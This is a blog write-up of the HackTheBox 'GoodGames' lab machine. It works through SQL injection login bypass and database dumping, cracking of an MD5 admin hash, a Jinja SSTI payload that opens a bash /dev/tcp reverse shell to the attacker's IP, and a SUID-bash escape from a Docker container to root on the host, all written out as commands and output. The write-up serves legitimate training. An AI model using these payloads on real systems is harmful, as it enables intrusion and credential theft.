---
layout: post
title: HackTheBox GoodGames
date: 2022-02-21
tags: [HackTheBox, Linux]
---

# Machine Synopsis

GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures to prevent the extraction and cracking of passwords from a compromised database, along with the dangers of password re-use. It also highlights the dangers of using `render_template_string` in a Python web application where user input is reflected, allowing Server Side Template Injection (SSTI) attacks. Privilege escalation involves docker hosts enumeration and shows how having admin privileges in a container and a low privilege user on the host machine can be dangerous, allowing attackers to escalate privileges to compromise the system. ([Source](https://www.hackthebox.com/machines/goodgames))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# nmap -sC -sV -A -p- 10.10.11.130
Nmap scan report for 10.10.11.130
Host is up (0.0036s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/15%OT=80%CT=1%CU=32176%PV=Y%DS=2%DC=T%G=Y%TM=62F9CF4
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: goodgames.htb

TRACEROUTE (using port 5900/tcp)
HOP RTT     ADDRESS
1   3.06 ms 10.10.14.1
2   3.69 ms 10.10.11.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.23 seconds
```

Here is their website out.

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/website.png?raw=true)

![sign_in](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/sign_in.png?raw=true)

![sign_up](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/sign_up.png?raw=true)

![coming_soon](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/coming_soon.png?raw=true)

Lets use `dirb` to check if we missed out anything hidden.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# dirb http://10.10.11.130 /usr/share/dirb/wordlists/common.txt   
...
---- Scanning URL: http://10.10.11.130/ ----
+ http://10.10.11.130/blog (CODE:200|SIZE:44212)                                                                     
+ http://10.10.11.130/forgot-password (CODE:200|SIZE:32744)                                                          
+ http://10.10.11.130/login (CODE:200|SIZE:9294)                                                                     
+ http://10.10.11.130/logout (CODE:302|SIZE:208)                                                                     
+ http://10.10.11.130/profile (CODE:200|SIZE:9267)                                                                   
+ http://10.10.11.130/server-status (CODE:403|SIZE:277)                                                              
+ http://10.10.11.130/signup (CODE:200|SIZE:33387)                                       
-----------------
```

Seems like we didn’t miss out anything important. Lets go back to the login page and register a new account.

![login_shiro](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/login_shiro.png?raw=true)

Once we registered for an account, the server seems to redirect us to `/profile` page.

```http
GET /profile HTTP/1.1
Host: 10.10.11.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=.eJw1yzEOgCAMBdC7_Jk4OHbyJoZIgSYFklYm493VwfEN78Kejb2CclTnAG5RFASvYmMrn5ZjNARIAq0BOkrhJB102nzDdLYeG_8H9wO9bRya.YvnU-g.1QzgQMNG2LPeUtsdc83Lp8_gKLQ

Upgrade-Insecure-Requests: 1
```

![profile](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/profile.png?raw=true)

Any attempts to edit the profile details results in `500 INTERNAL SERVER ERROR`.

![error](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/error.png?raw=true)

It seems that we might be on the wrong path. At this point, we might as well try some low hanging fruit such as SQL injection on the login page.

Trying `’or1=1--` failed but `’or1=1-- -` succeeded!

 ```http
 POST /login HTTP/1.1
 Host: 10.10.11.130
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 32
 Origin: http://10.10.11.130
 Connection: close
 Referer: http://10.10.11.130/login
 Upgrade-Insecure-Requests: 1
 
 email=%27+or+1%3D1--+-&password=
 ```

![admin](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/admin.png?raw=true)

```http
GET /profile HTTP/1.1
Host: 10.10.11.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=.eJw1yz0KgDAMBtC7fHMRXDN5E4kkjYX-QNNO4t3t4v7egzN29RsUObsGaOGUQWApqR7WmhgX9e0eFwKSgPaA3MxUUgWNPlearr0u9j-8Hz1GHgw.YvnWQQ.F7k5U05YRrNwVDXbh3CkIFNPWRM

Upgrade-Insecure-Requests: 1
```

# Exploit

![admin_profile](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/admin_profile.png?raw=true)

The only important information that we have here is `admin@goodgames.htb`. We need to find out more. Lets use SQL injection (`UNION SELECT`) to find out the number of columns in the database.

```http
- REQUEST -
POST /login HTTP/1.1
...
email=%27+union+select+1%2c2%2c3%2c4--+-&password=

- RESPONSE -
...
                   <h2 class="h4">Welcome 4</h2>
...
```

>   `' union select 1,2,3,4-- -`

There’s 4 columns in the database. Now lets get the database name.

```http
- REQUEST -
POST /login HTTP/1.1
...
email=%27+union+select+1%2c2%2c3%2cdatabase%28%29--+-&password=

- RESPONSE -
...
                   <h2 class="h4">Welcome main</h2>
...
```

>   `' union select 1,2,3,database()-- -`

Now lets view the tables in `main`.

```http
- REQUEST -
POST /login HTTP/1.1
...
email=%27+union+select+1%2c2%2c3%2cconcat%28table_name%2c+%22%2f%22%29+from+information_schema.tables+where+table_schema+%3d+%27main%27--+-&password=

- RESPONSE -
...
                   <h2 class="h4">Welcome blog/blog_comments/user/</h2>
...
```

>   `' union select 1,2,3,concat(table_name, "/") from information_schema.tables where table_schema = 'main'-- -`

The column we are interested in is `user`, so lets view that.

```http
- REQUEST -
POST /login HTTP/1.1
...
email=%27+union+select+1%2c2%2c3%2cconcat%28column_name%2c+%22%2f%22%29+from+information_schema.columns+where+table_schema+%3d+%27main%27+and+table_name+%3d+%27user%27--+-&password=

- RESPONSE -
...
                   <h2 class="h4">Welcome email/id/name/password/</h2>
...
```

>   `' union select 1,2,3,concat(column_name, "/") from information_schema.columns where table_schema = 'main' and table_name = 'user'-- -`

Finally, lets view the users in the table.

```http
- REQUEST -
POST /login HTTP/1.1
...
email=%27+union+select+1%2c2%2c3%2cconcat%28column_name%2c+%22%2f%22%29+from+information_schema.columns+where+table_schema+%3d+%27main%27+and+table_name+%3d+%27user%27--+-&password=

- RESPONSE -
...
1:admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
2:shiro:shiro@gmail.com:5f4dcc3b5aa765d61d8327deb882cf99
...
```

>   `' union select 1,2,3,concat(id, ":", name, ":", email, ":", password) from user-- -`

### `sqlmap` Method

Instead of manually testing for SQL injection, we can just use `sqlmap`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# cat login_request.txt
POST /login HTTP/1.1
Host: 10.10.11.130
...
Upgrade-Insecure-Requests: 1

email=shiro&password=password

┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# sqlmap -r login_request.txt --batch            
...
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=shiro' AND (SELECT 5981 FROM (SELECT(SLEEP(5)))BwdU) AND 'rWMN'='rWMN&password=password
---
[19:37:27] [INFO] the back-end DBMS is MySQL
...

┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# sqlmap -r login_request.txt --batch --dbs
...
[19:40:57] [INFO] retrieved: 
[19:41:02] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[19:42:00] [INFO] retrieved: main
available databases [2]:
[*] information_schema
[*] main
...

┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# sqlmap -r login_request.txt --batch -D main --tables
...
[19:44:36] [INFO] retrieved: blog
[19:44:51] [INFO] retrieved: blog_comments
[19:45:28] [INFO] retrieved: user
Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+
...

┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# sqlmap -r login_request.txt --batch -D main -T user --dump
...
[19:54:36] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                            
Database: main                                                                                                       
Table: user
[2 entries]
+----+-------+---------------------+---------------------------------------------+
| id | name  | email               | password                                    |
+----+-------+---------------------+---------------------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec            |
| 2  | shiro | shiro@gmail.com     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+----+-------+---------------------+---------------------------------------------+
...
```

We have the admin password hash! Lets identify the hash and try to brute-force it.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# hash-identifier         
...

 HASH: 2b22337f218b2d82dfc3b6f77e7cb8ec

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
...
                                             
┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt -format=Raw-MD5
...
superadministrator (?)     
...
```

We found the password `superadministrator`.

At the top right of the admin’s profile page, we can find another hidden login page by clicking on the gear icon. However, to access this website, we have to add the subdomain to our `/etc/hosts` file.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# cat /etc/hosts
...
10.10.11.130	goodgames.htb internal-administration.goodgames.htb
...
```

![internal_login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/internal_login.png?raw=true)

>   Take note that the web server might be using (Python) Flask!

Lets try logging in using the admin account found - `admin:superadministrator`.

![internal_dashboard](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/internal_dashboard.png?raw=true)

Looking around the internal webpage, I found an interesting function in the `/settings` page that allowed us to change some general information.

![internal_settings](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/internal_settings.png?raw=true)

```HTTP
- REQUEST -
GET /settings HTTP/1.1
Host: internal-administration.goodgames.htb
...

- RESPONSE -
HTTP/1.1 200 OK
Date: Mon, 15 Aug 2022 11:48:28 GMT
Server: Werkzeug/2.0.2 Python/3.6.7
Content-Type: text/html; charset=utf-8
Vary: Cookie,Accept-Encoding
Connection: close
Content-Length: 32559
...
```

Looking at the response, the site seems to be running on Python. Since the website is running on a Python server, we can test for Server Side Template Injection (SSTI)!

For this challenge, I tried using `{{0 + 1}}` as a payload for the `Full Name` input.

![ssti_test](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/ssti_test.png?raw=true)

The name was updated to the expected output - `1`!

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) showed that we can exploit the SSTI by calling `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`.

![ssti_id](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/GoodGames/ssti_id.png?raw=true)

Now, we can just change the `id` portion of the payload to a reverse shell code.

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "exec bash -i &>/dev/tcp/10.10.14.14/1234 <&1"').read() }}
```

Before we execute the code, we should open a netcat listener.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# nc -nlvp 1234                   
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.130] 48710
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
root

root@3a453ab39d3d:/backend# ls -la
total 28
drwxr-xr-x 1 root root 4096 Nov  5  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
-rw-r--r-- 1 root root  122 Nov  3  2021 Dockerfile
drwxr-xr-x 1 root root 4096 Nov  3  2021 project
-rw-r--r-- 1 root root  208 Nov  3  2021 requirements.txt
```

>   This was a Docker container.

# Privilege Escalation

Lets look around the container to check if we can find anything interesting.

```bash
root@3a453ab39d3d:/backend# cd /home
root@3a453ab39d3d:/home# ls -la
total 12
drwxr-xr-x 1 root root 4096 Nov  5  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 augustus

root@3a453ab39d3d:/home# cd augustus
root@3a453ab39d3d:/home/augustus# ls -la
total 24
drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
-rw-r----- 1 root 1000   33 Aug 15 04:33 user.txt
```

At this point, I was going round in circles. A writeup from [0xdf](https://0xdf.gitlab.io/2022/02/23/htb-goodgames.html) showed that we needed to check if the user `augustus` was in the `/etc/passwd` file.

```bash
root@3a453ab39d3d:/home/augustus# cat /etc/passwd | grep augustus

root@3a453ab39d3d:/home/augustus# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```

As there wasn’t any `augustus` in `/etc/passwd`, it might indicate that this home directory is mounted into the container from the host.

```bash
root@3a453ab39d3d:/home/augustus# mount | grep augustus
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

Now, we have to find the Docker’s host. We can do this by using a static binary of `nmap` from this GitHub [repository](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap).

```bash
- Netcat Listener -
root@3a453ab39d3d:/home/augustus# ip addr                           
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever

- Own Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
└─# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap

- Netcat Listener -
root@3a453ab39d3d:/home/augustus# wget http://10.10.14.14/nmap
root@3a453ab39d3d:/home/augustus# chmod +x nmap
root@3a453ab39d3d:/home/augustus# ./nmap 172.19.0.2/24
...
Not shown: 1205 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:D7:2B:35:73 (Unknown)

Nmap scan report for 3a453ab39d3d (172.19.0.2)
Host is up (0.000023s latency).
All 1207 scanned ports on 3a453ab39d3d (172.19.0.2) are closed
```

From the `nmap` scan, we can conclude that `172.19.0.1` should be the Docker host. Additionally, port 22 and 80 is open for `172.19.0.1`.

Now, we can try to `ssh` as `augustus` to `172.19.0.1`!

```bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
```

Hmm.. it seems like we need to get a proper shell. Lets check if `python` or `python3` is available.

```bash
root@3a453ab39d3d:/home/augustus# which python
/usr/local/bin/python
root@3a453ab39d3d:/home/augustus# which python3
/usr/local/bin/python3
```

Nice! Both `python` versions are available. Lets use `python3` to spawn a shell and then `ssh` as `augustus`.

```bash
root@3a453ab39d3d:/home/augustus# python3 -c 'import pty;pty.spawn("/bin/bash")'
<tus# python3 -c 'import pty;pty.spawn("/bin/bash")'
ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: superadministrator
...
augustus@GoodGames:~$ sudo -l
-bash: sudo: command not found
augustus@GoodGames:~$ ls
nmap  user.txt
```

Notice that the files in `augustus`'s actual folder seems to mimic the files in the Docker’s `augustus` folder.

```bash
augustus@GoodGames:~$ ls -la
total 5832
drwxr-xr-x 2 augustus augustus    4096 Aug 15 14:18 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rwxr-xr-x 1 root     root     5944464 Aug 15 13:50 nmap
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus      33 Aug 15 14:10 user.txt
```

Recall that we used the docker container to grab `nmap` from our own server? It shows that it is owned by `root`. Perhaps we can copy `/bin/bash` to our current actual directory and then use the docker container to assign it with root privileges + SUID bit set?

```bash
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls  
bash  nmap  user.txt
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.

root@3a453ab39d3d:/home/augustus# ls
bash  nmap  user.txt
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod +s bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: superadministrator
...
augustus@GoodGames:~$ ls -la
total 7040
drwxr-xr-x 2 augustus augustus    4096 Aug 15 15:01 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsr-sr-x 1 root     root     1234376 Aug 15 15:01 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rwxr-xr-x 1 root     root     5944464 Aug 15 13:50 nmap
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus      33 Aug 15 14:10 user.txt
augustus@GoodGames:~$ ./bash -p

bash-5.1# whoami
root
bash-5.1# cat /home/augustus/user.txt
e950d45708b4f0294a0facc97621ef35
bash-5.1# cat /root/root.txt
4c445d98ed713a143512122ca28a9d5f
```

>   `bash -p` preserves the SUID/GUID.
>
>   More Linux Privilege Escalation examples can be found [here](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst). 
